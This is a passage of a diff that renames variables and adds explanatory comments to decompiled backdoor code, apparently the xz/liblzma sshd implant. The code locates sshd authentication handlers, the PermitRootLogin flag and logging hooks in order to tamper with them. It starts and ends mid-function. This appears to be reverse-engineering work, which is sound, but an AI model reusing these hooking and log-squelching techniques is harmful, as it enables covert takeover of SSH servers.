+             (loader_data.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
+            sshd_ctx_cursor->mm_request_send_start = loader_data.sshd_string_refs.mm_request_send.func_start;
+            sshd_ctx_cursor->mm_request_send_end = loader_data.sshd_string_refs.mm_request_send.func_end;
             local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
             string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a98,(void *)0x0);
             sshd_ctx_cursor->STR_without_password = string_cursor;
@@ -397,7 +392,7 @@ LAB_00105951:
                                     &sshd_ctx_cursor->mm_answer_authpassword_start,
                                     &sshd_ctx_cursor->mm_answer_authpassword_end,
                                     &sshd_ctx_cursor->mm_answer_authpassword_slot,search_image,
-                                    &local_980.sshd_string_refs,ctx), probe_success == FALSE)) {
+                                    &loader_data.sshd_string_refs,ctx), probe_success == FALSE)) {
               sshd_ctx_cursor->mm_answer_authpassword_start = (sshd_monitor_func_t *)0x0;
               sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
               sshd_ctx_cursor->mm_answer_authpassword_slot = (sshd_monitor_func_t *)0x0;
@@ -410,7 +405,7 @@ LAB_00105951:
                                  (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                   &sshd_ctx_cursor->mm_answer_keyallowed_end,
                                   &sshd_ctx_cursor->mm_answer_keyallowed_slot,search_image,
-                                  &local_980.sshd_string_refs,ctx);
+                                  &loader_data.sshd_string_refs,ctx);
               if (probe_success == FALSE) {
                 sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                 sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
@@ -421,7 +416,7 @@ LAB_00105951:
                                    (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                     &sshd_ctx_cursor->mm_answer_keyverify_end,
                                     &sshd_ctx_cursor->mm_answer_keyverify_slot,search_image,
-                                    &local_980.sshd_string_refs,ctx);
+                                    &loader_data.sshd_string_refs,ctx);
                 if (probe_success == FALSE) {
                   sshd_ctx_cursor->mm_answer_keyverify_start = (sshd_monitor_func_t *)0x0;
                   sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
@@ -431,8 +426,8 @@ LAB_00105951:
             }
             if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||
                (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
-              live_sshd_ctx = (local_b10->global_ctx).sshd_ctx;
-              local_9d8.instruction = (u8 *)0x0;
+              live_sshd_ctx = (hooks_data->global_ctx).sshd_ctx;
+              probe_dasm_ctx.instruction = (u8 *)0x0;
               authprobe_func_start = live_sshd_ctx->mm_answer_authpassword_start;
               if (authprobe_func_start == (sshd_monitor_func_t *)0x0) {
                 authprobe_func_start = live_sshd_ctx->mm_answer_keyallowed_start;
@@ -447,11 +442,11 @@ LAB_00105951:
               local_a90 = CONCAT44(*(uint *)((u8 *)&local_a90 + 4),0x198);
               while (string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_a90,string_cursor),
                     string_cursor != (char *)0x0) {
-                local_9d8.instruction = (u8 *)0x0;
+                probe_dasm_ctx.instruction = (u8 *)0x0;
                 string_id = (EncodedStringId)string_cursor;
                 mem_address = elf_find_rela_reloc(search_image,string_id,(u8 *)0x0);
                 if (mem_address == (Elf64_Rela *)0x0) {
-                  local_9d8.instruction = (u8 *)0x0;
+                  probe_dasm_ctx.instruction = (u8 *)0x0;
                   relr_retry_flag = TRUE;
                   mem_address = (Elf64_Rela *)elf_find_relr_reloc(search_image,string_id);
                 }
@@ -463,7 +458,8 @@ LAB_00105951:
                                            ((u8 *)authprobe_func_start,authprobe_func_end,(dasm_ctx_t *)0x0,0x109,
                                             mem_address), probe_success != FALSE)) {
                       authprobe_func_start = sshd_ctx_cursor->mm_answer_authpassword_start;
-                      ((local_b10->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
+                      // AutoDoc: Pinpoint the shared auth-log format relocation pulled from mm_answer_* so later hooks can rewrite the literal in-place without rescanning the function.
+                      ((hooks_data->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
                       if (authprobe_func_start != (sshd_monitor_func_t *)0x0) {
                         sshd_ctx_cursor->have_mm_answer_authpassword = TRUE;
                       }
@@ -473,21 +469,22 @@ LAB_00105951:
                         sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                       }
                       auth_log_reloc = (int *)find_addr_referenced_in_mov_instruction
-                                                 (XREF_start_pam,&local_980.sshd_string_refs,text_segment
+                                                 (XREF_start_pam,&loader_data.sshd_string_refs,text_segment
                                                   ,scan_cursor + (long)text_segment);
                       if (auth_log_reloc != (int *)0x0) {
-                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = auth_log_reloc;
+                        // AutoDoc: Remember sshd's `use_pam` flag pointer so the monitor hooks can keep PAM-enabled builds aligned with the daemon's configuration.
+                        ((hooks_data->global_ctx).sshd_ctx)->use_pam_ptr = auth_log_reloc;
                       }
-                      decode_ctx_cursor = &local_9d8;
+                      decode_ctx_cursor = &probe_dasm_ctx;
                       relr_retry_flag = FALSE;
-                      *(uint *)&local_9d8.instruction_size = 0x70;
-                      local_9d8.instruction = (u8 *)0xc5800000948;
+                      *(uint *)&probe_dasm_ctx.instruction_size = 0x70;
+                      probe_dasm_ctx.instruction = (u8 *)0xc5800000948;
                       goto LAB_00106471;
                     }
                     if (relr_retry_flag) goto LAB_001063c8;
                     mem_address = elf_find_rela_reloc(search_image,string_id,(u8 *)0x0);
                   } while (mem_address != (Elf64_Rela *)0x0);
-                  local_9d8.instruction = (u8 *)0x0;
+                  probe_dasm_ctx.instruction = (u8 *)0x0;
 LAB_001063c8:
                   mem_address = (Elf64_Rela *)elf_find_relr_reloc(search_image,string_id);
                   relr_retry_flag = TRUE;
@@ -503,7 +500,7 @@ LAB_001063c8:
     }
   }
 LAB_00105a59:
-  local_b10 = (backdoor_hooks_data_t *)0x0;
+  hooks_data = (backdoor_hooks_data_t *)0x0;
   goto LAB_00105a60;
 code_r0x00105962:
   string_begin = string_begin + -0x40;
@@ -514,32 +511,32 @@ LAB_00106471:
     string_cursor = elf_find_string(search_image,(EncodedStringId *)decode_ctx_cursor,(void *)0x0);
     if (string_cursor != (char *)0x0) {
       if (relr_retry_flag) {
-        ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
+        ((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
         goto LAB_001064b8;
       }
       relr_retry_flag = TRUE;
     }
     decode_ctx_cursor = (dasm_ctx_t *)((long)&decode_ctx_cursor->instruction + 4);
-  } while (decode_ctx_cursor != (dasm_ctx_t *)((long)&local_9d8.instruction_size + 4));
-  ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
+  } while (decode_ctx_cursor != (dasm_ctx_t *)((long)&probe_dasm_ctx.instruction_size + 4));
+  ((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
 LAB_001064b8:
   auth_log_reloc = (int *)find_addr_referenced_in_mov_instruction
-                             (XREF_auth_root_allowed,&local_980.sshd_string_refs,text_segment,
+                             (XREF_auth_root_allowed,&loader_data.sshd_string_refs,text_segment,
                               scan_cursor + (long)text_segment);
   if (auth_log_reloc != (int *)0x0) {
-    if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
-       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
+    if ((((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
+       ((hooks_data->global_ctx).uses_endbr64 != FALSE)) {
       auth_root_vote_count = 0;
       loop_idx = 0;
-      *(uint *)&local_9d8.instruction_size = 0x10;
-      local_9d8.instruction = (u8 *)0xf0000000e;
+      *(uint *)&probe_dasm_ctx.instruction_size = 0x10;
+      probe_dasm_ctx.instruction = (u8 *)0xf0000000e;
       hooks = (backdoor_hooks_data_t *)0x0;
       do {
-        scan_cursor = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
-                        [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_start;
+        scan_cursor = (u8 *)(&loader_data.sshd_string_refs.xcalloc_zero_size)
+                        [*(uint *)(probe_dasm_ctx.opcode_window + loop_idx * 4 + -0x25)].func_start;
         if (scan_cursor != (u8 *)0x0) {
-          authprobe_func_end = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
-                          [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
+          authprobe_func_end = (u8 *)(&loader_data.sshd_string_refs.xcalloc_zero_size)
+                          [*(uint *)(probe_dasm_ctx.opcode_window + loop_idx * 4 + -0x25)].func_end;
           auth_root_vote_count = auth_root_vote_count + 1;
           probe_success = find_instruction_with_mem_operand(scan_cursor,authprobe_func_end,(dasm_ctx_t *)0x0,auth_log_reloc);
           if ((probe_success != FALSE) ||
@@ -550,79 +547,81 @@ LAB_001064b8:
         }
         loop_idx = loop_idx + 1;
       } while (loop_idx != 3);
+      // AutoDoc: Abort if every probe spots the auth_root literal but no MOV/ADD ever reaches it, which signals an sshd build we don't know how to patch safely.
       if ((auth_root_vote_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
     }
-    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = auth_log_reloc;
+    // AutoDoc: Publish the `PermitRootLogin` boolean only after the literal and pointer line up so later hooks can flip it without bricking sshd.
+    ((hooks_data->global_ctx).sshd_ctx)->permit_root_login_ptr = auth_log_reloc;
   }
 LAB_001065af:
-  bn_dup_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
+  bn_dup_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
   // AutoDoc: Locate the global monitor struct so the mm hook wrappers can patch sockets, flags, and auth state safely.
-  probe_success = sshd_find_monitor_struct(local_980.elf_handles.sshd,&local_980.sshd_string_refs,ctx);
+  probe_success = sshd_find_monitor_struct(loader_data.elf_handles.sshd,&loader_data.sshd_string_refs,ctx);
   if (probe_success == FALSE) {
-    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
-    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
+    (hooks_data->sshd_ctx).have_mm_answer_keyallowed = FALSE;
+    (hooks_data->sshd_ctx).have_mm_answer_keyverify = FALSE;
   }
-  sshd_log_ctx_ptr = (local_b10->global_ctx).sshd_log_ctx;
-  libc_allocator->opaque = local_980.elf_handles.libc;
+  sshd_log_ctx_ptr = (hooks_data->global_ctx).sshd_log_ctx;
+  libc_allocator->opaque = loader_data.elf_handles.libc;
   local_a98 = 0;
   sshd_log_ctx_ptr->log_squelched = FALSE;
   sshd_log_ctx_ptr->handler_slots_valid = FALSE;
-  text_segment = elf_get_code_segment(&local_980.main_info,&local_a98);
+  text_segment = elf_get_code_segment(&loader_data.main_info,&local_a98);
   signed_payload_size = local_a98;
   if ((((text_segment != (void *)0x0) && (0x10 < local_a98)) &&
-      ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
-     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
+      ((u8 *)loader_data.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
+     (((hooks_data->global_ctx).uses_endbr64 == FALSE ||
       (probe_success = is_endbr64_instruction
-                          ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start,
-                           (u8 *)((long)local_980.sshd_string_refs.sshlogv_format.func_start + 4),
+                          ((u8 *)loader_data.sshd_string_refs.sshlogv_format.func_start,
+                           (u8 *)((long)loader_data.sshd_string_refs.sshlogv_format.func_start + 4),
                            0xe230), probe_success != FALSE)))) {
-    sshd_log_ctx_ptr->sshlogv_impl = local_980.sshd_string_refs.sshlogv_format.func_start;
-    decode_ctx_cursor = &local_a30;
+    sshd_log_ctx_ptr->sshlogv_impl = loader_data.sshd_string_refs.sshlogv_format.func_start;
+    decode_ctx_cursor = &syslog_dasm_ctx;
     for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(undefined4 *)&decode_ctx_cursor->instruction = 0;
       decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
     }
-    if ((u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
-      local_b48 = (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_start;
-      local_b20 = (log_handler_fn *)0x0;
-      addr2 = (log_handler_fn *)0x0;
+    if ((u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
+      syslog_bad_level_cursor = (u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start;
+      validated_log_handler = (log_handler_fn *)0x0;
+      log_handler_ctx_candidate = (log_handler_fn *)0x0;
       do {
         while( TRUE ) {
-          if ((local_980.sshd_string_refs.syslog_bad_level.func_end <= local_b48) ||
-             ((local_b20 != (log_handler_fn *)0x0 && (addr2 != (log_handler_fn *)0x0))))
+          if ((loader_data.sshd_string_refs.syslog_bad_level.func_end <= syslog_bad_level_cursor) ||
+             ((validated_log_handler != (log_handler_fn *)0x0 && (log_handler_ctx_candidate != (log_handler_fn *)0x0))))
           goto LAB_00106bf0;
-          probe_success = x86_dasm(&local_a30,local_b48,
-                            (u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end);
+          probe_success = x86_dasm(&syslog_dasm_ctx,syslog_bad_level_cursor,
+                            (u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end);
           if (probe_success != FALSE) break;
-          local_b48 = local_b48 + 1;
+          syslog_bad_level_cursor = syslog_bad_level_cursor + 1;
         }
-        if ((*(u32 *)&local_a30.opcode_window[3] & 0xfffffffd) == 0xb1) {
-          if (local_a30.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
-          if ((local_a30.prefix.flags_u16 & 0x1040) == 0) {
-            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
+        if ((*(u32 *)&syslog_dasm_ctx.opcode_window[3] & 0xfffffffd) == 0xb1) {
+          if (syslog_dasm_ctx.prefix.decoded.modrm.breakdown.modrm_mod != '\x03') goto LAB_00106735;
+          if ((syslog_dasm_ctx.prefix.flags_u16 & 0x1040) == 0) {
+            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x40) != 0) {
               scratch_reg_index = 0;
 LAB_001067cf:
-              mov_dst_reg = local_a30.prefix.decoded.modrm.breakdown.modrm_rm;
-              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
-                mov_dst_reg = local_a30.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
+              mov_dst_reg = syslog_dasm_ctx.prefix.decoded.modrm.breakdown.modrm_rm;
+              if ((syslog_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+                mov_dst_reg = syslog_dasm_ctx.prefix.decoded.modrm.breakdown.modrm_rm | ((byte)syslog_dasm_ctx.prefix.decoded.rex & 1) << 3;
               }
               goto LAB_001067ed;
             }
             mov_dst_reg = 0;
           }
           else {
-            if ((local_a30.prefix.flags_u16 & 0x40) != 0) {
-              scratch_reg_index = local_a30.prefix.decoded.modrm.breakdown.modrm_reg;
-              if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
-                scratch_reg_index = scratch_reg_index | (char)local_a30.prefix.decoded.rex * '\x02' & 8U;
+            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x40) != 0) {
+              scratch_reg_index = syslog_dasm_ctx.prefix.decoded.modrm.breakdown.modrm_reg;
+              if ((syslog_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+                scratch_reg_index = scratch_reg_index | (char)syslog_dasm_ctx.prefix.decoded.rex * '\x02' & 8U;
               }
               goto LAB_001067cf;
             }
-            mov_dst_reg = local_a30.prefix.decoded.flags2 & 0x10;
-            if ((local_a30.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
-            scratch_reg_index = local_a30.mov_imm_reg_index;
-            if ((local_a30.prefix.flags_u16 & 0x20) != 0) {
-              scratch_reg_index = local_a30.mov_imm_reg_index | ((byte)local_a30.prefix.decoded.rex & 1) << 3;
+            mov_dst_reg = syslog_dasm_ctx.prefix.decoded.flags2 & 0x10;
+            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x1000) == 0) goto LAB_001067fb;
+            scratch_reg_index = syslog_dasm_ctx.mov_imm_reg_index;
+            if ((syslog_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+              scratch_reg_index = syslog_dasm_ctx.mov_imm_reg_index | ((byte)syslog_dasm_ctx.prefix.decoded.rex & 1) << 3;
             }
             mov_dst_reg = 0;
 LAB_001067ed:
@@ -631,104 +630,105 @@ LAB_001067ed:
 LAB_001067fb:
           mov_src_reg = 0;
           log_literal_slot = 0;
-          addr2 = (log_handler_fn *)0x0;
-          decode_ctx_cursor = &local_9d8;
+          log_handler_ctx_candidate = (log_handler_fn *)0x0;
+          decode_ctx_cursor = &probe_dasm_ctx;
           for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
             *(undefined4 *)&decode_ctx_cursor->instruction = 0;
             decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
           }
-          addr1 = (log_handler_fn *)0x0;
-          scan_cursor = local_b48;
-          for (; (scan_cursor < local_980.sshd_string_refs.syslog_bad_level.func_end && (log_literal_slot < 5));
+          log_handler_slot_candidate = (log_handler_fn *)0x0;
+          scan_cursor = syslog_bad_level_cursor;
+          for (; (scan_cursor < loader_data.sshd_string_refs.syslog_bad_level.func_end && (log_literal_slot < 5));
               log_literal_slot = log_literal_slot + 1) {
-            if ((addr1 != (log_handler_fn *)0x0) && (addr2 != (log_handler_fn *)0x0))
+            if ((log_handler_slot_candidate != (log_handler_fn *)0x0) && (log_handler_ctx_candidate != (log_handler_fn *)0x0))
             goto LAB_00106b3c;
             probe_success = find_mov_instruction
-                               (scan_cursor,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end,
-                                TRUE,FALSE,&local_9d8);
+                               (scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end,
+                                TRUE,FALSE,&probe_dasm_ctx);
             if (probe_success == FALSE) break;
-            if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
-              if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
-                mov_src_reg = local_9d8.prefix.decoded.flags2 & 0x10;
-                if (((local_9d8.prefix.flags_u16 & 0x1000) != 0) &&
-                   (mov_src_reg = local_9d8.mov_imm_reg_index, (local_9d8.prefix.flags_u16 & 0x20) != 0))
+            if ((probe_dasm_ctx.prefix.flags_u16 & 0x1040) != 0) {
+              if ((probe_dasm_ctx.prefix.flags_u16 & 0x40) == 0) {
+                mov_src_reg = probe_dasm_ctx.prefix.decoded.flags2 & 0x10;
+                if (((probe_dasm_ctx.prefix.flags_u16 & 0x1000) != 0) &&
+                   (mov_src_reg = probe_dasm_ctx.mov_imm_reg_index, (probe_dasm_ctx.prefix.flags_u16 & 0x20) != 0))
                 {
-                  scratch_reg_index = (char)local_9d8.prefix.decoded.rex << 3;
+                  scratch_reg_index = (char)probe_dasm_ctx.prefix.decoded.rex << 3;
                   goto LAB_001068e4;
                 }
               }
               else {
-                mov_src_reg = local_9d8.prefix.decoded.modrm.breakdown.modrm_reg;
-                if ((local_9d8.prefix.flags_u16 & 0x20) != 0) {
-                  scratch_reg_index = (char)local_9d8.prefix.decoded.rex * '\x02';
+                mov_src_reg = probe_dasm_ctx.prefix.decoded.modrm.breakdown.modrm_reg;
+                if ((probe_dasm_ctx.prefix.flags_u16 & 0x20) != 0) {
+                  scratch_reg_index = (char)probe_dasm_ctx.prefix.decoded.rex * '\x02';
 LAB_001068e4:
                   mov_src_reg = mov_src_reg | scratch_reg_index & 8;
                 }
               }
             }
-            pplVar46 = addr2;
-            if ((mov_dst_reg == mov_src_reg) && ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
-              pplVar48 = (log_handler_fn *)local_9d8.mem_disp;
-              if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
-                pplVar48 = (log_handler_fn *)
-                           ((u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
-                           CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
-                                    (undefined4)local_9d8.instruction_size));
+            log_handler_tmp_ptr = log_handler_ctx_candidate;
+            if ((mov_dst_reg == mov_src_reg) && ((probe_dasm_ctx.prefix.flags_u16 & 0x100) != 0)) {
+              log_handler_slot_tmp = (log_handler_fn *)probe_dasm_ctx.mem_disp;
+              if (((uint)probe_dasm_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
+                log_handler_slot_tmp = (log_handler_fn *)
+                           ((u8 *)(probe_dasm_ctx.mem_disp + (long)probe_dasm_ctx.instruction) +
+                           CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
+                                    (undefined4)probe_dasm_ctx.instruction_size));
               }
               local_a90 = 0;
-              pplVar45 = (log_handler_fn *)
-                         elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
-              if ((((pplVar45 == (log_handler_fn *)0x0) ||
-                   ((log_handler_fn *)(local_a90 + (long)pplVar45) <= pplVar48)) ||
-                  (pplVar48 < pplVar45)) ||
-                 (((pplVar48 == addr2 && (pplVar48 == addr1)) ||
-                  (pplVar46 = pplVar48, addr1 != (log_handler_fn *)0x0)))) goto LAB_00106997;
+              main_data_base = (log_handler_fn *)
+                         elf_get_data_segment(&loader_data.main_info,&local_a90,FALSE);
+              if ((((main_data_base == (log_handler_fn *)0x0) ||
+                   ((log_handler_fn *)(local_a90 + (long)main_data_base) <= log_handler_slot_tmp)) ||
+                  (log_handler_slot_tmp < main_data_base)) ||
+                 (((log_handler_slot_tmp == log_handler_ctx_candidate && (log_handler_slot_tmp == log_handler_slot_candidate)) ||
+                  (log_handler_tmp_ptr = log_handler_slot_tmp, log_handler_slot_candidate != (log_handler_fn *)0x0)))) goto LAB_00106997;
             }
             else {
 LAB_00106997:
-              pplVar48 = addr1;
-              addr2 = pplVar46;
+              log_handler_slot_tmp = log_handler_slot_candidate;
+              log_handler_ctx_candidate = log_handler_tmp_ptr;
             }
-            scan_cursor = local_9d8.instruction +
-                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
-                               (undefined4)local_9d8.instruction_size);
-            addr1 = pplVar48;
+            scan_cursor = probe_dasm_ctx.instruction +
+                      CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
+                               (undefined4)probe_dasm_ctx.instruction_size);
+            log_handler_slot_candidate = log_handler_slot_tmp;
           }
-          if ((addr1 == (log_handler_fn *)0x0) || (addr2 == (log_handler_fn *)0x0)) {
+          if ((log_handler_slot_candidate == (log_handler_fn *)0x0) || (log_handler_ctx_candidate == (log_handler_fn *)0x0)) {
 LAB_00106ab1:
-            addr2 = (log_handler_fn *)0x0;
-            local_b20 = (log_handler_fn *)0x0;
+            log_handler_ctx_candidate = (log_handler_fn *)0x0;
+            validated_log_handler = (log_handler_fn *)0x0;
           }
           else {
 LAB_00106b3c:
             // AutoDoc: Reject sshlogv handlers that fall outside `.data`; the log hook only executes if both pointers survive this validation.
             probe_success = validate_log_handler_pointers
-                               (addr1,addr2,text_segment,(u8 *)((long)text_segment + signed_payload_size),
-                                &local_980.sshd_string_refs,ctx);
-            local_b20 = addr1;
+                               (log_handler_slot_candidate,log_handler_ctx_candidate,text_segment,(u8 *)((long)text_segment + signed_payload_size),
+                                &loader_data.sshd_string_refs,ctx);
+            validated_log_handler = log_handler_slot_candidate;
             if (probe_success != FALSE) {
-              sshd_log_ctx_ptr->log_handler_slot = addr1;
-              search_image = &local_980.main_info;
-              sshd_log_ctx_ptr->log_handler_ctx_slot = addr2;
+              // AutoDoc: Record the sshlogv handler/context recovered from `syslog_bad_level` so the log shim can squelch or rewrite messages without disassembling again.
+              sshd_log_ctx_ptr->log_handler_slot = log_handler_slot_candidate;
+              search_image = &loader_data.main_info;
+              sshd_log_ctx_ptr->log_handler_ctx_slot = log_handler_ctx_candidate;
               sshd_log_ctx_ptr->handler_slots_valid = TRUE;
-              local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x708);
-              string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
+              probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x708);
+              string_cursor = elf_find_string(search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
               sshd_log_ctx_ptr->fmt_percent_s = string_cursor;
               if (string_cursor != (char *)0x0) {
-                local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x790);
-                string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
+                probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x790);
+                string_cursor = elf_find_string(search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                 sshd_log_ctx_ptr->str_connection_closed_by = string_cursor;
                 if (string_cursor != (char *)0x0) {
-                  local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x4f0);
-                  string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
+                  probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x4f0);
+                  string_cursor = elf_find_string(search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                   sshd_log_ctx_ptr->str_preauth = string_cursor;
                   if (string_cursor != (char *)0x0) {
-                    local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0x1d8);
-                    string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
+                    probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x1d8);
+                    string_cursor = elf_find_string(search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                     sshd_log_ctx_ptr->str_authenticating = string_cursor;
                     if (string_cursor != (char *)0x0) {
-                      local_9d8.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&local_9d8.instruction + 4),0xb10);
-                      string_cursor = elf_find_string(search_image,(EncodedStringId *)&local_9d8,(void *)0x0);
+                      probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0xb10);
+                      string_cursor = elf_find_string(search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                       sshd_log_ctx_ptr->str_user = string_cursor;
                       if (string_cursor != (char *)0x0) break;
                     }
@@ -740,83 +740,83 @@ LAB_00106b3c:
             }
           }
         }
-        else if ((((*(u32 *)&local_a30.opcode_window[3] == 0x147) &&
-                  ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
-                 ((local_a30.prefix.flags_u16 & 0x800) != 0)) && (local_a30.imm_zeroextended == 0))
+        else if ((((*(u32 *)&syslog_dasm_ctx.opcode_window[3] == 0x147) &&
+                  ((uint)syslog_dasm_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
+                 ((syslog_dasm_ctx.prefix.flags_u16 & 0x800) != 0)) && (syslog_dasm_ctx.imm_zeroextended == 0))
         {
-          addr1 = (log_handler_fn *)0x0;
-          if ((local_a30.prefix.flags_u16 & 0x100) != 0) {
-            addr1 = (log_handler_fn *)
-                    (local_a30.instruction + local_a30.instruction_size + local_a30.mem_disp);
+          log_handler_slot_candidate = (log_handler_fn *)0x0;
+          if ((syslog_dasm_ctx.prefix.flags_u16 & 0x100) != 0) {
+            log_handler_slot_candidate = (log_handler_fn *)
+                    (syslog_dasm_ctx.instruction + syslog_dasm_ctx.instruction_size + syslog_dasm_ctx.mem_disp);
           }
-          local_9d8.instruction = (u8 *)0x0;
-          pplVar46 = (log_handler_fn *)
-                     elf_get_data_segment(&local_980.main_info,(u64 *)&local_9d8,FALSE);
-          if (((pplVar46 != (log_handler_fn *)0x0) &&
-              (addr1 < local_9d8.instruction + (long)pplVar46)) && (pplVar46 <= addr1)) {
-            decode_ctx_cursor = &local_9d8;
-            for (loop_idx = 0x16; scan_cursor = local_b48, loop_idx != 0; loop_idx = loop_idx + -1) {
+          probe_dasm_ctx.instruction = (u8 *)0x0;
+          log_handler_tmp_ptr = (log_handler_fn *)
+                     elf_get_data_segment(&loader_data.main_info,(u64 *)&probe_dasm_ctx,FALSE);
+          if (((log_handler_tmp_ptr != (log_handler_fn *)0x0) &&
+              (log_handler_slot_candidate < probe_dasm_ctx.instruction + (long)log_handler_tmp_ptr)) && (log_handler_tmp_ptr <= log_handler_slot_candidate)) {
+            decode_ctx_cursor = &probe_dasm_ctx;
+            for (loop_idx = 0x16; scan_cursor = syslog_bad_level_cursor, loop_idx != 0; loop_idx = loop_idx + -1) {
               *(undefined4 *)&decode_ctx_cursor->instruction = 0;
               decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + (ulong)wipe_stride * -8 + 4);
             }
             do {
               probe_success = find_instruction_with_mem_operand_ex
-                                 (scan_cursor,(u8 *)local_980.sshd_string_refs.syslog_bad_level.func_end
